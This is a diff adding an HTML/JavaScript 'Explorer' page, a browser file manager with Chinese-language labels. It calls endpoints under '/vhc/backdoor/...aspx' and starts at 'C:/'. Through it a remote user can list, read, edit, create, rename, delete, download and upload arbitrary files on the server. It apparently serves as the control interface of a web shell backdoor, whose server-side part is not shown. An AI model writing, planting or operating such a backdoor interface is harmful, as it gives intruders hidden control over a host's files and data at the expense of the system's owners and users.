@@ -1,0 +1,409 @@
+<html>
+	<head>
+		<title>Explorer</title>
+		<meta charset="utf-8">
+		<meta http-equiv="Expires" content="0">
+		<meta http-equiv="Pragma" content="no-cache">
+		<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+		<script src="https://code.jquery.com/jquery.min.js"></script>
+		<style>
+			.dir{
+				display: inline-block;
+				width: 400; 
+				background: #FFDD88;
+			}
+			.dir:hover{
+				background: #FFCC33;
+			}
+			.file{
+				display: inline-block;
+				width: 400; 
+				background: #B3D1E7;
+			}
+			.file:hover{
+				background: #336699;
+			}
+			#view > iframe{
+				width: 100%;
+				height: 100%;
+			}
+			#edit > textarea{
+				width: 100%;
+				height: 100%;
+			}
+			#drop{
+				position: relative;
+				border: 2px dashed #ccc;
+				background-color: rgba(255, 255, 255);
+				min-height: 50px
+			}
+			#drop.cover{
+				border: 2px dashed #000;
+				background-color: rgba(200, 200, 200);
+			}
+		</style>
+	</head>
+	<body onload="read(currentPath)">
+		<h1> Explorer </h1>
+		
+		<div>
+			<button onclick="pathBack(currentPath)"> 上一頁 </button>
+			<label> DIR: </label> 
+			<input id="path" type="text" oninput="read(this.value)"/> 
+			<button onclick="read(currentPath+'/..')"> .. </button>
+			<button onclick="download(currentPath)">下載當前項目</button>
+		</div>
+		
+		<div>
+			<div id="list">
+				<button onclick="create(currentPath, 'dir')"> + 新資料夾</button>
+				<button onclick="create(currentPath, 'file')"> + 新文件</button>
+				<br/>
+				<ul id="drop" draggable="true"></ul>
+			</div>
+			<div id="view">
+				<button onclick="edit(currentPath)">編輯</button>
+				<br/>
+				<iframe id="frame"></iframe>
+			</div>
+			<div id="edit">
+				<button onclick="save(currentPath)">儲存</button>
+				<button onclick="read(currentPath)">取消</button>
+				<br/>
+				<textarea></textarea>
+			</div>
+		</div>
+		
+		<form id="download" method="POST">
+			<input name="path" type="hidden">
+		</form>
+		
+		<template id="item">
+			<li width="100%" path="replace with file path">
+				<span>[文件名稱]</span>
+				<button onclick="rename(this.parentNode.path, this.parentNode.type)">更名</button>
+				<button onclick="remove(this.parentNode.path, this.parentNode.type)">刪除</button>
+			</li>
+		</template>
+		
+		<script>
+			// global varable
+			let currentPath = "C:/";
+						
+			// api
+			let typeApi = 		"/vhc/backdoor/site/type2.aspx" //?path
+			let dirScanApi 	= 	"/vhc/backdoor/dir/scan2.aspx" //?dir
+			let dirCreateApi = 	"/vhc/backdoor/dir/create.aspx" //?dir
+			let dirDeleteApi = 	"/vhc/backdoor/dir/delete.aspx" //?path
+			let dirRenameApi = 	"/vhc/backdoor/dir/rename.aspx" //?path, name
+			let dirDownloadApi = "/vhc/backdoor/dir/download.aspx" //?path
+			let fileScanApi = 	"/vhc/backdoor/file/scan2.aspx" //?dir
+			let fileReadApi = 	"/vhc/backdoor/file/read2.aspx" //?path
+			let fileWriteApi = 	"/vhc/backdoor/file/write.aspx" //?path, content
+			let fileCreateApi = "/vhc/backdoor/file/create.aspx" //?dir
+			let fileDeleteApi = "/vhc/backdoor/file/delete.aspx" //?path
+			let fileRenameApi = "/vhc/backdoor/file/rename.aspx" //?path, name
+			let fileDownloadApi = "/vhc/backdoor/file/download.aspx" //?path
+			let fileUploadsApi = "/vhc/backdoor/file/uploads.aspx" //?path
+			
+			function initialPath(){
+				let filePath = window.location.pathname;
+				let dirPath = filePath.substring(0, filePath.lastIndexOf('/'));
+				return dirPath
+			}
+
+			function initialDrop(){
+				let dropDom = $('#drop')
+				dropDom.on("dragover", e => {
+					e.preventDefault();
+					dropDom.addClass('cover')
+				});
+				dropDom.on("dragleave", e => {
+					e.preventDefault();
+					e.preventDefault();
+					dropDom.removeClass('cover')
+				});
+				dropDom.on("drop", e => {
+					e.preventDefault();
+					e.preventDefault();
+					dropDom.removeClass('cover')
+					drop(e.originalEvent.dataTransfer.items)
+				});
+			}
+			
+			function pathBack(path){
+				splits = path.split('/')
+				if(splits.length > 1){
+					splits.pop()
+					path = splits.join('/')
+					read(path)
+				}
+			}
+			
+			function extractEmpty(path){
+				tokens = path.split('/')
+				buffer = tokens.pop()
+				
+				tokens = tokens.filter(t => t != '')
+				tokens.push(buffer)
+				
+				return tokens.join('/')
+			}
+			
+			function extractDotDot(path){
+				buffer = []
+				tokens = path.split('/')
+				tokens.forEach(token => {
+					if(token == '..' && buffer.length > 0 && buffer[buffer.length-1] != '..'){
+						buffer.pop()
+					}else{
+						buffer.push(token)
+					}
+				})
+				return buffer.join('/')
+			}
+			function alwaysHaveRoot(path){
+				return path[0] == "/" 
+					? path 
+					: '/'+path
+			}
+			
+			async function read(path){
+				let pathDom = $('#path')
+				let listDom = $('#list')
+				let viewDom = $('#view')
+				let editDom = $('#edit')
+				
+				currentPath = path
+				pathDom.val(path)
+				console.log(path)
+				
+				let type = await $.post(typeApi, {path: path})
+				switch(type){
+					case 'dir':
+						readDir(path)
+						listDom.show()
+						viewDom.hide()
+						editDom.hide()
+						break;
+					case 'file':
+						readFile(path)
+						viewDom.show()
+						listDom.hide()
+						editDom.hide()
+						break;
+				}
+			}
+			
+			function readDir(path){
+				let listDom = $('#list').find('ul')
+				let itemTemplate = $('#item')
+				
+				$.when(
+					$.post(dirScanApi, {path: path}),
+					$.post(fileScanApi, {path: path}),
+				).done((resA, resB) => {
+					let dirs = JSON.parse(resA[0])
+					let files = JSON.parse(resB[0])
+					
+					// clear
+					listDom.empty()
+					
+					// append dirs
+					dirs.forEach(dir => {
+						let item = $(itemTemplate.html())
+						item[0].path = `${path}/${dir}`
+						item[0].type = 'dir'
+						item.find('span').text(dir)
+						item.find('span').addClass('dir')
+						item.find('span').dblclick(() => {
+							read(path+'/'+dir);
+						})
+						listDom.append(item)
+					})
+					
+					// append files
+					files.forEach(file => {
+						let item = $(itemTemplate.html())
+						item[0].path = `${path}/${file}`
+						item[0].type = 'file'
+						item.find('span').text(file)
+						item.find('span').addClass('file')
+						item.find('span').dblclick(() => {
+							read(path+'/'+file);
+						})
+						listDom.append(item)
+					})
+				});
+			}
+			
+			function readFile(path){
+				let viewDom = $('#view').find('iframe')
+				viewDom.attr('src', path);
+			}
+			
+			function edit(path){
+				let listDom = $('#list')
+				let viewDom = $('#view')
+				let editDom = $('#edit')
+				let codeDom = $('#edit').find('textarea')
+				
+				$.post(fileReadApi, {
+					path: path
+				}).done(() => {
+					editDom.show()
+					viewDom.hide()
+					listDom.hide()
+				}).done(res => {
+					codeDom.val(res)
+				})
+			}
+			
+			function save(path){
+				let editDom = $('#edit')
+				
+				if (!confirm(`確定要修改 "${path}" 的內容?`))
+					return;
+				
+				content = editDom.find('textarea').val()
+				
+				$.post(fileWriteApi, {
+					path: path, 
+					content: content
+				}).done(res => {
+					read(currentPath)
+				})
+			}
+			
+			function create(path, type){
+				if (!confirm(`確定要在 "${path}" 下新增?`))
+					return;
+				
+				switch(type){
+					case 'dir':
+						$.post(dirCreateApi, {dir: path})
+						 .done(() => read(currentPath) )
+						break;
+					case 'file':
+						$.post(fileCreateApi, {dir: path})
+						 .done(() => read(currentPath) )
+						break;
+				}
+			}
+			
+			function rename(path, type){
+				let name = prompt(`要將 "${path}" 取名為什麼名子?`)
+				if (!name) return;
+				
+				switch(type){
+					case 'dir':
+						$.post(dirRenameApi, {path: path, name: name})
+						 .done(() => read(currentPath) )
+						break;
+					case 'file':
+						$.post(fileRenameApi, {path: path, name: name})
+						 .done(() => read(currentPath) )
+						break;
+				}
+			}
+			
+			function remove(path, type){
+				let agree = confirm(`確定要刪除 "${path}" 嗎?`)
+				if (!agree) return;
+				
+				switch(type){
+					case 'dir':
+						$.post(dirDeleteApi, {path: path})
+						 .done(() => read(currentPath) )
+						break;
+					case 'file':
+						$.post(fileDeleteApi, {path: path})
+						 .done(() => read(currentPath) )
+				}
+			}
+			
+			async function download(path){
+				let formDom = $('#download')
+				let pathDom = formDom.find('input')
+				
+				let type = await $.post(typeApi, {path: path})
+				switch(type){
+					case 'dir':
+						pathDom.val(path)
+						formDom.attr('action', dirDownloadApi)
+						formDom.submit()
+						break;
+					case 'file':
+						pathDom.val(path)
+						formDom.attr('action', fileDownloadApi)
+						formDom.submit()
+						break;
+				}
+			}
+			
+			async function drop(items){
+				let agree = confirm(`確定要上傳檔案嗎?`)
+				if (!agree) return;
+				
+				let entries = [];
+				for (let i = 0; i < items.length; i++) {
+					item = items[i]
+					entry = item.webkitGetAsEntry()
+					entries.push(entry)
+				}
+				
+				let result = await getFiles(entries, currentPath)
+				let files = result.files
+				let dirs = result.dirs
+				
+				let formData = new FormData()
+				files.forEach(file => formData.append('files[]', file))
+				dirs.forEach(path => formData.append('dirs[]', path))
+				
+				$.ajax({
+					type: 'POST',
+					url: fileUploadsApi,
+					data: formData,
+					processData: false,
+					contentType: false,
+				}).done(res => {
+					console.log(res);
+					read(currentPath)
+				})
+			}
+						
+			async function getFiles(entries, dir = "") {
+				let files = []
+				let dirs = []
+				for (let i = 0; i < entries.length; i++){
+					entry = entries[i];
+					if (entry.isFile) {
+						await new Promise((resolve, reject) => {
+							entry.file(file => {
+								files.push(file)
+								dirs.push(dir)
+								resolve()
+							})
+						})
+					} else if (entry.isDirectory) {
+						await new Promise((resolve, reject) => {
+							entry.createReader().readEntries(async (entries) => {
+								result = await getFiles(entries, `${dir}/${entry.name}`)
+								files = files.concat(result.files)
+								dirs = dirs.concat(result.dirs)
+								resolve()
+							})
+						})
+					}
+				}
+				
+				
+				return {
+					files: files,
+					dirs: dirs,
+				}
+			}
+			
+		</script>
+	</body>
+</html>
